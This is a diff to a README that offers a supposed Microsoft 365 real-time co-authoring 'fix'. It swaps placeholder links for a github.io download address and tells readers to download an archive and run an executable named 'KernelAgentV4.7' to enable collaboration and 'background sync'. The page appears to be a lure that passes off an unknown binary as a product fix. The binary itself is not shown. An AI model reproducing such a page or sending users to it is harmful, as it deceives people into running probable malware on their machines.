@@ -2,13 +2,15 @@
 
 Activate Microsoft 365’s real-time co-authoring capabilities to work together on Word, Excel, and PowerPoint files simultaneously. This installer restores and enables all collaboration functions using `KernelAgentV4.7`.
 
-[![Download Co-authoring Fix](https://img.shields.io/badge/Download-CoAuthoring_Tool-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Co-authoring Fix](https://img.shields.io/badge/Download-CoAuthoring_Tool-blueviolet)](https://m365-coauthoring-realtime-collaboration.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://m365-coauthoring-realtime-collaboration.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any directory (e.g. `C:\M365CoAuthoring`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7` to enable co-authoring services and background sync  
 4. 👥 Open a document stored in OneDrive or SharePoint and share with collaborators  
